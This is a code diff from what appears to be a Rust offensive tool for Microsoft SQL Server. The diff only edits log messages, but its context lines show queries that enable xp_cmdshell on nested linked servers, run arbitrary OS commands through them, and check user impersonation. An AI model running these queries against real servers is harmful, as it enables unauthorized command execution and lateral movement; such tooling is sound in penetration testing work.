@@ -129,7 +129,7 @@ async fn exec_nested_cmd(client: &mut Client<TcpStream>, linked_comp: &str, nest
     query = String::from(format!("EXEC ('EXEC(''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT {}') AT {}", &nested_linked_comp, &linked_comp));
     execute_query(client, &query).await;
 
-    println!("[+] Executing nested command");
+    println!("[+] Executing command on {} from {}", &nested_linked_comp, &linked_comp);
     query = String::from(format!("EXEC ('EXEC(''xp_cmdshell ''''{}'''' '') AT {}') AT {}", &command, &nested_linked_comp, &linked_comp));
     execute_query(client, &query).await;
 
@@ -190,7 +190,7 @@ async fn main() {
 
             if get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0] == impersonate_user.to_string() {
                 println!("[+] Success!");
-                println!("--> Now logged in as: {}", get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0]);
+                println!("--> Now logged in as: {}", impersonate_user.to_string());
             } else {
                 println!("[!] Could not impersonate user!");
                 println!("[+] Trying to impersonate dbo user...");
@@ -239,7 +239,6 @@ async fn main() {
             }
 
             if get_answer(format!("Do you want to find additional linked SQL servers on {}? (y/n)", &linked_comp).as_str()) {
-                // Nested commands
                 println!("[+] Finding linked servers on {}", &linked_comp);
                 query = String::from(format!("EXEC ('sp_linkedservers') AT {}", &linked_comp));
                 let nested_linked: Vec<String> = get_query(&mut conn, &query, true).await.unwrap();
